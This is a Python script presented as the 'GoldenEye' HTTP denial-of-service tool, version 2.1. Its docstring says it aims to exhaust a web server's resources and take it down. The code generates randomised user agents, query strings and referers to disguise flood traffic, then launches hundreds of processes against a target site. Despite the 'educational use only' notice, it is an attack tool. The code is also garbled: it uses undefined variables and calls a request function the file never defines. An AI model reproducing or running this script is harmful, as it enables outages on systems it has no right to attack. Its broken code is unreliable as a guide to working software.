#!/usr/bin/env python
"""
$Id: $

     /$$$$$$            /$$       /$$                     /$$$$$$$$                    
    /$$__  $$          | $$      | $$                    | $$_____/                    
   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$ 
   | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
   | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
   | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
   |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
    \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
                                                                     /$$  | $$          
                                                                    |  $$$$$$/          
                                                                     \______/           
                                                                                                                                                                                                      


This tool is a dos tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Seidl <http://wroot.org/>

@date 2014-02-18
@version 2.1

@TODO Test in python 3.x

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

import sys, argparse, random, urlparse, ssl, time, os; from multiprocessing import Process, Manager, Pool
# Python version-specific
if sys.version_info < (3,0):
    #Python 2.x
    import httplib
    HTTPCLIENT = httplib
else:
    #Python 3.x
    import http.client
    HTTPCLIENT = http.client

DEBUG = False
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'
JOIN_TIMEOUT=1.0
DEFAULT_WORKERS=10
DEFAULT_SOCKETS=500

parser = argparse.ArgumentParser()
parser.add_argument('--website', '-t', help='Website to stress test')
parser.add_argument('--useragents', '-u', help='File with user-agents to use')
parser.add_argument('--sockets', '-s', default=500, help='Number of concurrent sockets - (Default: 500)')
parser.add_argument('--workers', '-w', default=10, help='Number of concurrent workers - (Default: 10)')
parser.add_argument('--method', '-m', default=get, help='HTTP Method to use - (Default: get)')
parser.add_argument('--debug', '-d', default=False, help='Enable Debug Mode [more verbose output] - (Default: False)')
parser.add_argument('--help', '-h', help='Shows this help')
systemArgument = parser.parse_args()

if not systemArguments.website:
    sys.exit("Please supply at least the URL")

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [ 'Linux x86_64', 'Linux i386' ],
            'ext': [ 'X11' ]
        },
        'windows': {
            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
            'ext': [ 'WOW64', 'Win64; x64' ]
        },
        'mac': {
            'name': [ 'Macintosh' ],
            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10,11), random.randint(0,9), random.randint(0,5)) for i in range(1,10) ]
        },
    },
    'platform': {
        'webkit': {
            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535,537), random.randint(1,36)) for i in range(1, 30) ],
            'details': [ 'KHTML, like Gecko' ],
            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6,32), random.randint(100,2000), random.randint(0,100), random.randint(535,537), random.randint(1,36)) for i in range(1,30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4,6), random.randint(0,1), random.randint(0,9), random.randint(535,537), random.randint(1,36)) for i in range(1,10) ]
        },
        'iexplorer': {
            'browser_info': {
                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
                'ext_pre': [ 'compatible', 'Windows; U' ],
                'ext_post': [ 'Trident/%d.0' % i for i in range(4,6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1,3), random.randint(0,5), random.randint(1000,30000)) for i in range(1,10) ]
            }
        },
        'gecko': {
            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001,2010), random.randint(1,31), random.randint(1,12) , random.randint(10,25)) for i in range(1,30) ],
            'details': [],
            'extensions': []
        }
    }
}
def getUserAgents(): #Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
    mozilla_version = "Mozilla/5.0" 
    os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
    os_name = random.choice(os['name']) 
    sysinfo = os_name
    platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]
    if 'browser_info' in platform and platform['browser_info']:
        browser = platform['browser_info']
        browser_string = random.choice(browser['name'])
        if 'ext_pre' in browser:
            browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
        sysinfo = "%s; %s" % (browser_string, sysinfo)
        if 'ext_post' in browser:
            sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
    if 'ext' in os and os['ext']:
        sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
    ua_string = "%s (%s)" % (mozilla_version, sysinfo)
    if 'name' in platform and platform['name']:
        ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
    if 'details' in platform and platform['details']:
        ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
    if 'extensions' in platform and platform['extensions']:
        ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
    return(ua_string)

def buildblock(size):
    out_str=''
    _LOWERCASE = range(97, 122)
    _UPPERCASE = range(65, 90)
    _NUMERIC = range(48, 57)
    validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
    for i in range(0, size):
        a = random.choice(validChars)
        out_str += chr(a)
    return(out_str)

def generateQueryString(ammount=1):
    queryString = []
    for i in range(ammount):
        key = buildblock(random.randint(3,10))
        value = buildblock(random.randint(3,20))
        element = "{0}={1}".format(key, value)
        queryString.append(element)
    return '&'.join(queryString)
    
referers = \
	(
		'http://www.google.com/?q=', \
          'http://www.bing.com/?q=', \
          'http://www.google.co.uk/?q=', \
          'http://www.google.ru/?q=', \
          'http://www.youtube.com/?q=', \
          'http://www.yandex.com/?q=', \
          'http://www.baidu.com/?q=', \
          'http://www.facebook.com/?q=', \
          'http://' + website + '/', \
		'http://www.usatoday.com/search/results?q=', \
		'http://engadget.search.aol.com/search?q='
		)

for i in range(0, int(system.Arguments.sockets)):
    referer = random.choice(referers)
    userAgent = getUserAgents()
    t1 = Process(target = GoldenEyeRequest.httpAttackRequest, args = (systemArguments.website, userAgent, referer))
    t1.start()
